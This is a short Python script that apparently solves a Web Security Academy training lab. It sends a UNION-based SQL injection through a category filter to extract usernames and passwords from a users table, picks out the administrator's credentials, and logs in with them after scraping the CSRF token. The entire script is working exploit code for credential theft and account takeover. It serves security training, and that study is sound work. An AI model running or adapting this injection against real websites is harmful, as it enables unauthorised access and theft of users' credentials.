import requests, urllib
from lxml import html

def encodeURI(s):
    return urllib.parse.quote(s)

session = requests.Session()
URL = "https://0ae60046038b76d984b5fe32000a0093.web-security-academy.net/"

# Extract password

PAYLOAD_1 = "filter?category=" + encodeURI("' UNION SELECT NULL, username || ':' || password FROM users-- -")

response = session.get(URL + PAYLOAD_1).text
parser = html.fromstring(response)

accounts = parser.xpath("//th/text()")
admin_account = [x for x in accounts if 'administrator' in x][0].split(':')

username = admin_account[0]
password = admin_account[1]

# Login

response = session.get(URL + "login").text
parser = html.fromstring(response)
csrf_token = parser.xpath("//input[@name='csrf']/@value")

PAYLOAD_2 = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

session.post(URL + "login", data=PAYLOAD_2)

